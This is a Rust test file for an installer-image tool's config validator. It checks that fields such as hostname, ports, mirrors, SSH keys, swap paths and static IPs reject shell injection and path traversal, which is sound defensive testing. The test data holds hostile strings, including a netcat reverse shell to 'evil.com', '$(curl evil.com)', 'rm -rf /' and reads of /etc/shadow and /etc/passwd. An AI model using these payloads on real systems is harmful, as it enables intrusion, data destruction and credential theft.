//! Tests for [`super::InjectConfig::validate`].
//!
//! Split from the original `inject.rs` monolith. Each test is preserved
//! verbatim (assertion text, ordering, fixture data).

use super::*;
use crate::config::{
    FirewallConfig, GrubConfig, NetworkConfig, ProxyConfig, SshConfig, SwapConfig, UserConfig,
};

#[test]
fn inject_rejects_shell_metachar_in_username() {
    let cfg = InjectConfig {
        username: Some("admin; rm -rf /".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_shell_metachar_in_port() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec!["22; nc -e /bin/sh evil.com".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_valid_fields() {
    let cfg = InjectConfig {
        hostname: Some("web-server.lab".into()),
        username: Some("admin".into()),
        user: UserConfig {
            groups: vec!["docker".into(), "sudo".into()],
            ..Default::default()
        },
        firewall: FirewallConfig {
            allow_ports: vec!["22/tcp".into(), "80:443/tcp".into()],
            ..Default::default()
        },
        enable_services: vec!["sshd".into(), "docker.service".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_default_allows_spaces_and_commas() {
    // GRUB menu titles routinely contain spaces and commas, e.g.
    // "Ubuntu, with Linux 6.x-generic" -- these must not be rejected.
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu, with Linux 6.x-generic".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_default_rejects_shell_metachar() {
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu$(rm -rf /)".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn grub_default_accepts_slash_path() {
    // sed now uses | as delimiter so / in grub_default is safe.
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu/recovery".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_cmdline_accepts_slash_path() {
    // sed now uses | as delimiter so / in cmdline params is safe.
    let cfg = InjectConfig {
        grub: GrubConfig {
            cmdline_extra: vec!["root=/dev/sda1".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_cmdline_accepts_valid_params() {
    let cfg = InjectConfig {
        grub: GrubConfig {
            cmdline_extra: vec![
                "quiet".into(),
                "splash".into(),
                "nomodeset".into(),
                "intel_iommu=on".into(),
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_shell_metachar_in_sudo_command() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["ALL; rm -rf /".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_shell_metachar_in_apt_repo() {
    let cfg = InjectConfig {
        apt_repos: vec!["ppa:user/repo'; echo pwned".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_shell_metachar_in_mount() {
    let cfg = InjectConfig {
        mounts: vec!["/dev/sda1 /mnt ext4 defaults 0 0; whoami".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_shell_metachar_in_apt_mirror() {
    let cfg = InjectConfig {
        apt_mirror: Some("http://mirror.example.com$(id)".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_shell_metachar_in_proxy() {
    let cfg = InjectConfig {
        proxy: ProxyConfig {
            http_proxy: Some("http://proxy.example.com; cat /etc/passwd".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_unsafe_dns_server() {
    let cfg = InjectConfig {
        network: NetworkConfig {
            dns_servers: vec!["8.8.8.8; rm -rf /".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_unsafe_ntp_server() {
    let cfg = InjectConfig {
        network: NetworkConfig {
            ntp_servers: vec!["ntp.example.com$(id)".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_valid_sudo_commands() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["/usr/bin/apt".into(), "/usr/sbin/reboot".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_accepts_valid_apt_repos() {
    let cfg = InjectConfig {
        apt_repos: vec!["deb http://archive.ubuntu.com/ubuntu noble main".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_accepts_valid_mount_entries() {
    let cfg = InjectConfig {
        mounts: vec!["/dev/sda1 /mnt ext4 defaults 0 0".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_bare_url_as_apt_repo() {
    // A raw URL is not a valid sources.list line (missing "deb " prefix).
    let cfg = InjectConfig {
        apt_repos: vec!["http://archive.ubuntu.com/ubuntu".into()],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "bare URL without 'deb ' prefix must be rejected"
    );
}

#[test]
fn inject_accepts_ppa_shorthand_as_apt_repo() {
    // PPA shorthands are handled via add-apt-repository in generated late-commands.
    let cfg = InjectConfig {
        apt_repos: vec!["ppa:deadsnakes/ppa".into()],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "ppa: shorthand must be accepted (handled via add-apt-repository)"
    );
}

#[test]
fn inject_accepts_deb_src_apt_repo() {
    let cfg = InjectConfig {
        apt_repos: vec!["deb-src http://archive.ubuntu.com/ubuntu noble main".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "deb-src line must be accepted");
}

// -- InjectConfig validate edge cases --

#[test]
fn inject_rejects_semicolon_in_hostname() {
    let cfg = InjectConfig {
        hostname: Some("bad;host".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_hostname_with_dash_and_dot() {
    let cfg = InjectConfig {
        hostname: Some("my-host.example.com".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_newline_in_realname() {
    let cfg = InjectConfig {
        realname: Some("Jane\nDoe".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_realname_with_space() {
    let cfg = InjectConfig {
        realname: Some("Jane Doe".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_backtick_in_service_name() {
    let cfg = InjectConfig {
        enable_services: vec!["ssh`whoami`".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_ipv6_ntp_server() {
    // IPv6 addresses are valid NTP/DNS server addresses; the validator
    // uses is_safe_network_addr which allows colons for IPv6.
    let cfg = InjectConfig {
        network: NetworkConfig {
            ntp_servers: vec!["2001:db8::1".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "IPv6 NTP address must be accepted by the network-address validator"
    );
}

#[test]
fn inject_accepts_ipv6_dns_server() {
    let cfg = InjectConfig {
        network: NetworkConfig {
            dns_servers: vec!["2001:4860:4860::8888".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "IPv6 DNS address must be accepted by the network-address validator"
    );
}

#[test]
fn inject_rejects_dns_with_shell_metachar() {
    // A DNS entry with a semicolon is still unsafe and must be rejected.
    let cfg = InjectConfig {
        network: NetworkConfig {
            dns_servers: vec!["1.1.1.1; rm -rf /".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "DNS entry with shell metacharacter must be rejected"
    );
}

#[test]
fn inject_accepts_hostname_with_dots() {
    // RFC-1123 hostnames use dots -- the validator allows them.
    let cfg = InjectConfig {
        hostname: Some("my.host.example.com".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_hostname_with_shell_metachar() {
    let cfg = InjectConfig {
        hostname: Some("host$(id)".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_realname_with_single_quote() {
    let cfg = InjectConfig {
        realname: Some("O'Brien".into()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "single quote in realname is a shell metachar and must be rejected"
    );
}

#[test]
fn inject_accepts_grub_default_with_slash() {
    // sed now uses | as delimiter so / in grub_default is safe.
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu/recovery".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "grub_default with '/' must be accepted (sed uses | delimiter)"
    );
}

#[test]
fn inject_rejects_sysctl_value_with_semicolon() {
    let cfg = InjectConfig {
        sysctl: vec![("net.ipv4.ip_forward".into(), "1; rm -rf /".into())],
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_apt_repo_without_deb_prefix() {
    // Arbitrary text that is not a valid sources.list line must be caught.
    let cfg = InjectConfig {
        apt_repos: vec!["http://ppa.launchpad.net/user/ppa/ubuntu".into()],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "apt_repo missing 'deb ' prefix must be rejected"
    );
}

#[test]
fn inject_accepts_valid_deb_src_apt_repo() {
    let cfg = InjectConfig {
        apt_repos: vec![
            "deb http://archive.ubuntu.com/ubuntu noble main".into(),
            "deb-src http://archive.ubuntu.com/ubuntu noble main".into(),
        ],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "valid deb/deb-src lines must pass");
}

#[test]
fn inject_rejects_apt_mirror_with_shell_metachar() {
    let cfg = InjectConfig {
        apt_mirror: Some("http://mirror.example.com/ubuntu; malicious".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_proxy_with_backtick() {
    let cfg = InjectConfig {
        proxy: ProxyConfig {
            http_proxy: Some("http://proxy.example.com:3128`whoami`".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_sudo_command_with_pipe() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["/usr/bin/systemctl | cat /etc/shadow".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_valid_sudo_command() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["/usr/bin/systemctl".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_accepts_empty_string_for_validated_fields() {
    // is_safe_identifier returns Ok on empty input -- validated fields may be empty.
    let cfg = InjectConfig {
        hostname: Some(String::new()),
        username: Some(String::new()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "empty strings must be allowed");
}

// -- out_name validation --

#[test]
fn inject_rejects_out_name_with_path_traversal() {
    let cfg = InjectConfig {
        out_name: "../../etc/passwd".into(),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "out_name with path traversal must be rejected"
    );
}

#[test]
fn inject_rejects_out_name_with_shell_metachar() {
    let cfg = InjectConfig {
        out_name: "output$(id).iso".into(),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "out_name with shell metacharacter must be rejected"
    );
}

#[test]
fn inject_accepts_valid_out_name() {
    let cfg = InjectConfig {
        out_name: "my-custom-ubuntu.iso".into(),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "plain filename must be accepted");
}

// -- DNF mirror / repo validation --

#[test]
fn inject_rejects_dnf_mirror_with_sed_delimiter() {
    let cfg = InjectConfig {
        dnf_mirror: Some("https://mirror.example.com|evil".into()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "dnf_mirror with | (sed delimiter) must be rejected"
    );
}

#[test]
fn inject_accepts_valid_dnf_mirror() {
    let cfg = InjectConfig {
        dnf_mirror: Some("https://mirror.example.com/fedora".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "clean dnf_mirror URL must pass");
}

#[test]
fn inject_rejects_dnf_repo_url_with_single_quote() {
    let cfg = InjectConfig {
        dnf_repos: vec!["https://evil.example.com/'; rm -rf /".into()],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "dnf_repo URL with single quote must be rejected"
    );
}

#[test]
fn inject_accepts_dnf_repo_stanza_with_dollar_sign() {
    // $releasever and $basearch are standard DNF stanza variables.
    // They go through a heredoc (not single-quoted shell), so $ is safe.
    let cfg = InjectConfig {
        dnf_repos: vec!["[rpmfusion-free]\nbaseurl=https://mirrors.rpmfusion.org/free/fedora/$releasever/$basearch\nenabled=1".into()],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "dnf_repo stanza with $releasever must be accepted"
    );
}

// -- Pacman mirror / repo validation --

#[test]
fn inject_rejects_pacman_mirror_with_single_quote() {
    let cfg = InjectConfig {
        pacman_mirror: Some("https://mirror.example.com/arch'; evil".into()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "pacman_mirror with single quote must be rejected (breaks shell quoting)"
    );
}

#[test]
fn inject_accepts_pacman_mirror_with_dollar_sign() {
    // Pacman mirror URLs are single-quoted in shell; $ is literal in single-quoted strings.
    let cfg = InjectConfig {
        pacman_mirror: Some("https://mirror.pkgbuild.com".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "clean pacman_mirror URL must pass");
}

#[test]
fn inject_rejects_pacman_repo_with_newline() {
    let cfg = InjectConfig {
        pacman_repos: vec!["Server = https://good.mirror.com\nrm -rf /".into()],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "pacman_repo with newline must be rejected (would break echo command)"
    );
}

#[test]
fn inject_accepts_valid_pacman_repo_entry() {
    // $repo and $arch are pacman template variables -- safe in single-quoted strings.
    let cfg = InjectConfig {
        pacman_repos: vec!["Server = https://mirror.pkgbuild.com/$repo/os/$arch".into()],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "standard pacman Server= line with template vars must be accepted"
    );
}

// -- DNF heredoc sentinel collision --

#[test]
fn inject_rejects_dnf_repo_stanza_containing_heredoc_sentinel() {
    // A line that is exactly the heredoc sentinel would terminate the
    // `cat > .repo << 'FORGEISO_REPO_EOF'` heredoc early, producing a
    // truncated .repo file.
    let cfg = InjectConfig {
        dnf_repos: vec![
            "[myrepo]\nbaseurl=https://mirror.example.com\nFORGEISO_REPO_EOF\ngpgcheck=1".into(),
        ],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "dnf_repo stanza containing heredoc sentinel line must be rejected"
    );
}

#[test]
fn inject_accepts_dnf_repo_stanza_with_sentinel_as_substring() {
    // The sentinel only terminates if it appears alone on a line -- as a
    // substring of a longer line it is harmless.
    let cfg = InjectConfig {
        dnf_repos: vec![
            "[myrepo]\n# generated by FORGEISO_REPO_EOF_marker\nbaseurl=https://mirror.example.com\n".into(),
        ],
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "sentinel as substring of a longer line must be accepted"
    );
}

// -- SSH key validation --

#[test]
fn inject_rejects_ssh_key_with_single_quote() {
    // Mint preseed uses printf '%s\n' 'KEY' -- a single quote in the key
    // content would break out of the single-quoting and allow arbitrary
    // shell injection.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec!["ssh-ed25519 AAAA'; evil_cmd #".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "authorized_key with single quote must be rejected"
    );
}

#[test]
fn inject_rejects_ssh_key_containing_heredoc_sentinel() {
    // Defense in depth: even though the heredoc approach is no longer used,
    // a key whose content matches the old FORGEISO_KEY_EOF sentinel as a
    // standalone line is still rejected.  If the heredoc approach is ever
    // reintroduced, this check prevents early termination.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec![
                "ssh-ed25519 AAAA...\nFORGEISO_KEY_EOF\nssh-ed25519 BBBB...".into()
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "authorized_key containing heredoc sentinel as a standalone line must be rejected"
    );
}

#[test]
fn inject_accepts_valid_ssh_key() {
    // A well-formed ed25519 public key with a realistic comment must be accepted.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec![
                "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFORGEISo_KEY_EOF_not_a_sentinel user@host"
                    .into(),
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "valid SSH public key must be accepted"
    );
}

// -- Swap filename --

#[test]
fn inject_rejects_relative_swap_filename() {
    // A relative filename like "myswap" produces /targetmyswap (missing the
    // path separator), and mkswap/fstab would reference a non-existent path.
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 1024,
            filename: Some("myswap".into()),
            swappiness: None,
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "relative swap_filename must be rejected"
    );
}

#[test]
fn inject_accepts_absolute_swap_filename() {
    // The default "/swapfile" and any absolute path must be accepted.
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 1024,
            filename: Some("/swap/swapfile".into()),
            swappiness: None,
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "absolute swap_filename must be accepted"
    );
}

// -- SSH key double-quote and newline validation --

#[test]
fn inject_rejects_ssh_key_with_double_quote() {
    // Kickstart wraps keys in double quotes: sshkey --username=user "KEY"
    // A double quote inside the key comment would terminate the argument early
    // and allow injection into the kickstart file.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec![r#"ssh-ed25519 AAAA user@"hostname""#.into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "SSH key with double quote must be rejected"
    );
}

#[test]
fn inject_rejects_ssh_key_with_newline() {
    // Newlines in an SSH key break line-oriented directives (Kickstart sshkey,
    // preseed late_command) and are not valid in authorized_keys entries.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec!["ssh-ed25519 AAAA\nmalicious-command".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "SSH key with embedded newline must be rejected"
    );
}

#[test]
fn inject_rejects_swap_filename_with_dotdot() {
    // A swap filename containing .. could produce /target/../etc/passwd
    // (resolving to /etc/passwd on the running installer system) via
    // `fallocate -l {mb}M /target{fname}`.  The validator must block it.
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 512,
            filename: Some("/../etc/passwd".to_string()),
            swappiness: None,
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "swap_filename with .. path traversal must be rejected"
    );
}

#[test]
fn inject_accepts_valid_swap_filename() {
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 1024,
            filename: Some("/swapfile".to_string()),
            swappiness: Some(10),
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "valid absolute swap_filename must be accepted"
    );
}

#[test]
fn encrypt_without_passphrase_is_rejected() {
    let cfg = InjectConfig {
        encrypt: true,
        encrypt_passphrase: None,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("encrypt_passphrase"),
        "error must mention encrypt_passphrase: {msg}"
    );
}

#[test]
fn encrypt_with_passphrase_is_accepted() {
    let cfg = InjectConfig {
        encrypt: true,
        encrypt_passphrase: Some("correct-horse-battery-staple".to_string()),
        storage_layout: Some("lvm".to_string()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "encrypt=true with passphrase + storage_layout must pass validation"
    );
}

#[test]
fn encrypt_without_storage_layout_is_rejected() {
    // Regression: encrypt=true without storage_layout was silently accepted
    // but the YAML had no storage.layout block to attach the LUKS password to,
    // causing encryption to be silently skipped by cloud-init.
    let cfg = InjectConfig {
        encrypt: true,
        encrypt_passphrase: Some("supersecret".to_string()),
        storage_layout: None,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("storage_layout"),
        "error must mention storage_layout: {msg}"
    );
}

#[test]
fn wallpaper_filename_rejects_shell_injection() {
    // The wallpaper filename is embedded unquoted in a `cp /cdrom/wallpaper/{fname}` shell
    // command -- a semicolon, space, or other metacharacter allows code injection.
    for bad in &[
        "/tmp/foo;bar.jpg",      // semicolon in filename
        "/tmp/my wallpaper.jpg", // space in filename
        "/tmp/wall$(uname).jpg", // dollar-paren in filename
        "/tmp/wall`id`.jpg",     // backtick in filename
        "/tmp/wall'inject'.jpg", // single-quote in filename
    ] {
        let cfg = InjectConfig {
            wallpaper: Some(PathBuf::from(bad)),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "wallpaper {:?} with unsafe characters must be rejected",
            bad
        );
    }
}

#[test]
fn wallpaper_filename_accepts_safe_names() {
    for good in &[
        "/tmp/wallpaper.jpg",
        "/home/user/my-wallpaper_v2.png",
        "/media/background+image.webp",
    ] {
        let cfg = InjectConfig {
            wallpaper: Some(PathBuf::from(good)),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "wallpaper {:?} with safe filename must be accepted",
            good
        );
    }
}

#[test]
fn static_ip_rejects_shell_metacharacters() {
    // static_ip is placed in cloud-init YAML, Kickstart --ip=, and preseed
    // directives.  Shell metacharacters must be rejected to prevent malformed
    // configs and potential injection into installer directives.
    for bad in &[
        "192.168.1.1; rm -rf /",
        "192.168.1.1 && cat /etc/shadow",
        "$(curl evil.com)",
        "192.168.1.1\nnewline-injected",
    ] {
        let cfg = InjectConfig {
            static_ip: Some((*bad).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "static_ip {:?} must be rejected",
            bad
        );
    }
}

#[test]
fn static_ip_accepts_valid_cidr() {
    for good in &["192.168.1.10/24", "10.0.0.1/8", "2001:db8::1/64"] {
        let cfg = InjectConfig {
            static_ip: Some((*good).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "static_ip {:?} must be accepted",
            good
        );
    }
}

#[test]
fn gateway_rejects_shell_metacharacters() {
    for bad in &["10.0.0.1; rm -rf /", "10.0.0.1 | cat /etc/passwd"] {
        let cfg = InjectConfig {
            gateway: Some((*bad).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "gateway {:?} must be rejected",
            bad
        );
    }
}

#[test]
fn gateway_accepts_valid_ip() {
    for good in &["10.0.0.1", "192.168.1.1", "2001:db8::1"] {
        let cfg = InjectConfig {
            gateway: Some((*good).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "gateway {:?} must be accepted",
            good
        );
    }
}

// -- Swap validation --

#[test]
fn inject_rejects_swap_size_zero() {
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 0,
            ..Default::default()
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "swap.size_mb == 0 must be rejected"
    );
}

#[test]
fn inject_accepts_swap_size_nonzero() {
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 512,
            ..Default::default()
        }),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "swap.size_mb 512 must be accepted");
}

#[test]
fn inject_rejects_swappiness_over_100() {
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 1024,
            swappiness: Some(101),
            ..Default::default()
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "swappiness 101 must be rejected (max 100)"
    );
}

#[test]
fn inject_accepts_swappiness_at_boundary() {
    for v in [0u8, 60, 100] {
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 1024,
                swappiness: Some(v),
                ..Default::default()
            }),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "swappiness {v} must be accepted");
    }
}

// -- Port validation --

#[test]
fn inject_rejects_port_zero() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec!["0".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err(), "port 0 must be rejected");
}

#[test]
fn inject_rejects_port_over_65535() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec!["99999".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err(), "port 99999 must be rejected");
}

#[test]
fn inject_accepts_port_range_valid() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec![
                "80:443/tcp".to_string(),
                "22".to_string(),
                "ssh".to_string(),
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "valid port specs must be accepted");
}

// -- GRUB timeout validation --

#[test]
fn inject_rejects_grub_timeout_over_3600() {
    let cfg = InjectConfig {
        grub: GrubConfig {
            timeout: Some(3601),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "grub_timeout > 3600 must be rejected"
    );
}

#[test]
fn inject_accepts_grub_timeout_at_boundary() {
    for t in [0u32, 1, 10, 3600] {
        let cfg = InjectConfig {
            grub: GrubConfig {
                timeout: Some(t),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "grub_timeout {t} must be accepted");
    }
}

// -- timezone / locale / keyboard_layout validation --

#[test]
fn inject_rejects_timezone_with_semicolon() {
    let cfg = InjectConfig {
        timezone: Some("UTC; rm -rf /".into()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "timezone with ';' must be rejected"
    );
}

#[test]
fn inject_accepts_valid_timezone() {
    for tz in ["UTC", "America/New_York", "Europe/London", "Etc/GMT+5"] {
        let cfg = InjectConfig {
            timezone: Some(tz.into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "timezone {tz:?} must be accepted");
    }
}

#[test]
fn inject_rejects_locale_with_metachar() {
    let cfg = InjectConfig {
        locale: Some("en_US.UTF-8; evil".into()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err(), "locale with ';' must be rejected");
}

#[test]
fn inject_accepts_valid_locale() {
    for loc in ["en_US.UTF-8", "de_DE", "zh_CN.UTF-8"] {
        let cfg = InjectConfig {
            locale: Some(loc.into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "locale {loc:?} must be accepted");
    }
}

#[test]
fn inject_rejects_keyboard_layout_with_metachar() {
    let cfg = InjectConfig {
        keyboard_layout: Some("us$(id)".into()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "keyboard_layout with '$' must be rejected"
    );
}

#[test]
fn inject_accepts_valid_keyboard_layout() {
    for kb in ["us", "de", "gb", "us-intl"] {
        let cfg = InjectConfig {
            keyboard_layout: Some(kb.into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "keyboard_layout {kb:?} must be accepted"
        );
    }
}

// -- expected_sha256 validation --

#[test]
fn inject_rejects_sha256_wrong_length() {
    let cfg = InjectConfig {
        expected_sha256: Some("abc123".into()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "expected_sha256 with wrong length must be rejected"
    );
}

#[test]
fn inject_rejects_sha256_non_hex() {
    let cfg = InjectConfig {
        expected_sha256: Some("z".repeat(64)),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "expected_sha256 with non-hex chars must be rejected"
    );
}

#[test]
fn inject_accepts_valid_sha256() {
    let cfg = InjectConfig {
        expected_sha256: Some(
            "a948904f2f0f479b8f936b0e0b4a12d4b9d1f2e3c4d5e6f7a8b9c0d1e2f3a4b5".into(),
        ),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "valid 64-char hex SHA-256 must pass"
    );
}

#[test]
fn inject_accepts_sha256_uppercase() {
    // uppercase hex is normalised to lowercase before checking
    let cfg = InjectConfig {
        expected_sha256: Some(
            "A948904F2F0F479B8F936B0E0B4A12D4B9D1F2E3C4D5E6F7A8B9C0D1E2F3A4B5".into(),
        ),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "uppercase 64-char hex SHA-256 must pass"
    );
}

// -- dnf_mirror null byte --

#[test]
fn inject_rejects_dnf_mirror_with_null_byte() {
    let cfg = InjectConfig {
        dnf_mirror: Some("https://mirror.example.com/\0evil".into()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "dnf_mirror with null byte must be rejected"
    );
}

// -- swap upper bound --

#[test]
fn inject_rejects_swap_size_exceeding_max() {
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 200_000,
            ..Default::default()
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "swap size > 131072 MB must be rejected"
    );
}

#[test]
fn inject_accepts_swap_size_at_max_boundary() {
    let cfg = InjectConfig {
        swap: Some(SwapConfig {
            size_mb: 131_072,
            ..Default::default()
        }),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "swap size exactly 131072 MB must be accepted"
    );
}
